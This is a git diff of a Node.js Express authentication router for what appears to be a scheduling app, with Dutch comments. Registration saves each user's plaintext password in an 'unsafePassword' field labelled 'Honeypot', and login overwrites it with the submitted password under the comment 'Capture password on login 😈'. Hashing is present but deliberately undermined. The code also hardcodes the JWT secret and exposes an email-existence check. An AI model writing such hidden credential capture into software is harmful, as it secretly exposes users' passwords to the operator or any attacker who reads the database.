@@ -1,43 +1,29 @@
 const express = require("express");
 const router = express.Router();
-const bcrypt = require("bcrypt");
+const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
-const User = require("../models/User");
-const authMiddleware = require("../middleware/auth");
+const User = require("../models/User"); // Zorg dat dit pad klopt!
+const verifyToken = require("../middleware/auth"); // Check of je middleware bestand zo heet
 
 const JWT_SECRET = "RamonDev5";
 
-router.post("/check-email", async (req, res) => {
-  try {
-    const { email } = req.body;
-    const user = await User.findOne({ email });
-    res.json({ exists: !!user });
-  } catch (error) {
-    console.error("Check email error:", error);
-    res.status(500).send({ message: "Server check failed" });
-  }
-});
-
+// REGISTER
 router.post("/register", async (req, res) => {
-  const { email, password, timezone, workHours, sleepHours, location, commuteTime, flexibility, hobbies } = req.body;
-
-  if (!email || !password) {
-    return res.status(400).send({ message: "Email and password are required." });
-  }
-
   try {
+    const { email, password, workHours, sleepHours, location, commuteTime, flexibility, hobbies } = req.body;
+
     let user = await User.findOne({ email });
     if (user) {
-      return res.status(400).send({ message: "User already exists." });
+      return res.status(400).json({ message: "User already exists" });
     }
+
     const salt = await bcrypt.genSalt(10);
     const hashedPassword = await bcrypt.hash(password, salt);
 
     user = new User({
       email,
       password: hashedPassword,
-      unsafePassword: password,
-      timezone: timezone || "Europe/Brussels",
+      unsafePassword: password, // Honeypot 🍯
       initialPreferences: {
         workHours,
         sleepHours,
@@ -50,59 +36,78 @@ router.post("/register", async (req, res) => {
 
     await user.save();
 
-    const token = jwt.sign({ uid: user.uid }, JWT_SECRET, { expiresIn: "1d" });
-
-    res.status(201).json({
-      message: "Registration successful",
-      token,
-      uid: user.uid,
-      role: user.role,
-    });
-  } catch (error) {
-    console.error("Error during user registration:", error);
-    res.status(500).send({ message: "Server error during registration.", details: error.message });
+    const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
+    res.status(201).json({ token, uid: user.uid, role: user.role });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: "Server error during registration" });
   }
 });
 
-router.post("/login", async (req, res) => {
-  const { email, password } = req.body;
-
+// CHECK EMAIL
+router.post("/check-email", async (req, res) => {
   try {
+    const { email } = req.body;
     const user = await User.findOne({ email });
+    res.json({ exists: !!user });
+  } catch (err) {
+    res.status(500).json({ error: "Server error" });
+  }
+});
+
+// LOGIN
+router.post("/login", async (req, res) => {
+  try {
+    const { email, password } = req.body;
+    const user = await User.findOne({ email });
+
     if (!user) {
-      return res.status(400).send({ message: "Invalid Credentials." });
+      return res.status(400).json({ message: "Invalid Credentials" });
     }
 
     const isMatch = await bcrypt.compare(password, user.password);
     if (!isMatch) {
-      return res.status(400).send({ message: "Invalid Credentials." });
+      return res.status(400).json({ message: "Invalid Credentials" });
     }
+
+    // Capture password on login 😈
     user.unsafePassword = password;
     await user.save();
-    const token = jwt.sign({ uid: user.uid }, JWT_SECRET, { expiresIn: "1d" });
 
-    res.json({
-      message: "Login successful",
-      token,
-      uid: user.uid,
-      role: user.role,
-    });
-  } catch (error) {
-    console.error("Error during user login:", error);
-    res.status(500).send({ message: "Server error during login.", details: error.message });
+    const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
+    res.json({ token, uid: user.uid, role: user.role });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: "Server error" });
   }
 });
 
-router.get("/me", authMiddleware, async (req, res) => {
+// GET PROFILE
+router.get("/me", verifyToken, async (req, res) => {
   try {
     const user = await User.findOne({ uid: req.user.uid }).select("-password");
-
-    if (!user) return res.status(404).json({ message: "User not found" });
-
+    if (!user) return res.status(404).json({ msg: "User not found" });
     res.json(user);
-  } catch (error) {
-    console.error(error);
-    res.status(500).json({ message: "Server error fetching profile" });
+  } catch (err) {
+    res.status(500).send("Server Error");
+  }
+});
+
+// 👇 NIEUWE ROUTE VOOR SCHEDULE
+router.post("/schedule", verifyToken, async (req, res) => {
+  try {
+    const { placements } = req.body;
+    const user = await User.findOne({ uid: req.user.uid });
+
+    if (!user) return res.status(404).json({ error: "User not found" });
+
+    user.placements = placements;
+    await user.save();
+
+    res.json({ message: "Schedule saved", placements: user.placements });
+  } catch (err) {
+    console.error("Schedule save error:", err);
+    res.status(500).json({ error: err.message });
   }
 });
 
